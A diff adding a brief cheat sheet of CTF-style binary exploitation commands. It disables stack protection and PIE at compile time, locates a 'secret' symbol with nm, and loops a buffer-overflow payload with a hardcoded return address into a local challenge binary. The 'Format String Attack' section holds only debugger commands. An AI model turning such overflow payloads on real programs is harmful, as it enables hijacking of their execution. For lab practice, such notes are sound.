@@ -1,0 +1,16 @@
+Binary Exploit:
+strings test.exe | findstr CTF
+
+Buffer Overflow:
+gcc test.c -o test -fno-stack-protector -no-pie
+nm challenge | grep secret
+for i in 32 40 48 56 64; do
+echo OFFSET=$i
+python3 -c "import sys;sys.stdout.buffer.write(b'A'*$i+b'\x90\x11\x40\x00\x00\x00\x00\x00')" | ./challenge
+done
+
+Format String Attack:
+
+break vulnerable_function
+run
+call secret_function()
